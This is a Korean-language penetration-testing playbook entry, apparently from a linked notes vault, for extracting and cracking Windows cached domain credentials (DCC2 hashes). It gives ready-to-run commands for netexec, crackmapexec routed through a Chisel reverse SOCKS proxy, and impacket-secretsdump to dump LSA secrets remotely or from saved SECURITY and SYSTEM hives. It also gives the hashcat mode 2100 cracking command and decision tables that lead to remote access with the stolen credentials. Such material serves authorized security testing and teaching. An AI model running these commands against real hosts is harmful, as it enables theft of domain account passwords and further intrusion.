---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 원격 관리자급 SMB 작업 권한 또는 SECURITY·SYSTEM hive 확보"]
필요권한: ["대상 호스트의 로컬 관리자급 원격 작업 권한 또는 SECURITY·SYSTEM 파일 읽기 권한"]
필요조건: ["SMB 요청자 인증 수단 또는 같은 설치의 security.save·system.save", "오프라인 크래킹 환경"]
결과: ["캐시된 도메인 로그인 DCC2 hash", "크래킹 성공 시 도메인 계정 평문 비밀번호 후보"]
---

# Windows Cached Domain Credentials 추출

## 한 줄 판단

대상 Windows 호스트에 원격 관리자급 SMB 작업을 수행할 수 있거나 SECURITY·SYSTEM hive를 확보했으면 캐시된 도메인 로그인 DCC2 hash를 추출해 오프라인 크래킹한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 원격 또는 오프라인 경로 | 관리자급 원격 작업 또는 같은 설치의 SECURITY·SYSTEM 확보 | 인증 주체, hive 출처와 파일 존재 확인 | 현재 접근에 맞는 추출 경로 재선택 |
| 분석 입력 | `$DCC2$` 또는 cached domain logon 출력 확보 | secretsdump 출력 형식 확인 | SECURITY·SYSTEM 조합과 대상 Windows 설치 확인 |
| 크래킹 환경 | Hashcat mode 2100 입력 파일과 wordlist 준비 | hash 한 줄 형식과 장치 확인 | 사용자명·반복 횟수·구분자 형식 점검 |

## 실행

`<REQUESTER>`는 원격 작업을 요청하는 계정이고 `$DCC2$` 출력의 계정과 같다고 가정하지 않는다. `<TARGET>`은 hive가 있는 Windows 호스트, `<DOMAIN>`은 requester의 인증 범위, `<CCACHE_FILE>`은 공격 호스트의 Kerberos 입력 파일이다.

### Linux 공격 호스트에서 원격 추출

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --lsa
impacket-secretsdump '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>'
```

Chisel reverse SOCKS와 기존 CrackMapExec 문법을 사용하는 경우:

```bash
proxychains -f ./chisel-socks.conf crackmapexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --lsa
```

`Pwn3d!` 또는 원격 명령 실행으로 해당 대상에서 관리자급 원격 작업 권한을 확인한 뒤 실행한다. `--lsa` 출력 중 cached domain logon 또는 `$DCC2$` 행만 이 절차의 입력으로 사용하고, 서비스 secret과 `DPAPI_SYSTEM`은 [[Windows LSA Secrets 추출]]로 넘긴다.

### Linux 분석 호스트에서 오프라인 추출

```bash
impacket-secretsdump -security security.save -system system.save LOCAL
```

확인할 출력:

- cached domain logon 또는 `$DCC2$` 형식의 도메인 사용자와 hash.
- 로컬 SAM NTLM hash와 DCC2 출력을 서로 구분한다.

### DCC2 오프라인 크래킹

```bash
hashcat -m 2100 <DCC2_HASH_FILE> <WORDLIST> --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- 복구된 도메인 사용자와 평문 비밀번호 후보.
- 복구 값은 정상 클라이언트 인증으로 현재 유효성을 별도 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| cached domain logon 또는 `$DCC2$` 출력 | 캐시된 도메인 로그인 hash 추출 성공 | 오프라인 크래킹 입력 확보 | Hashcat mode 2100 실행 |
| Hashcat이 평문 후보 반환 | DCC2 크래킹 성공 | 도메인 계정 비밀번호 후보 | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| NTLM 형식만 출력 | SAM hash와 DCC2 결과를 혼동함 | DCC2 미확인 | SECURITY hive와 cached logon 출력 재확인 |

## 확인할 출력과 권한

- DCC2는 원본 NTLM hash가 아니므로 [[Pass the Hash]]에 직접 사용하지 않는다.
- 캐시에 계정이 있다는 사실과 현재 도메인 계정이 활성 상태라는 사실은 다르다.
- 크래킹 성공 뒤 도메인·사용자 형식과 실제 서비스 권한을 따로 확인한다.

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[crackmapexec]]
- [[proxychains]]
- [[hashcat]]
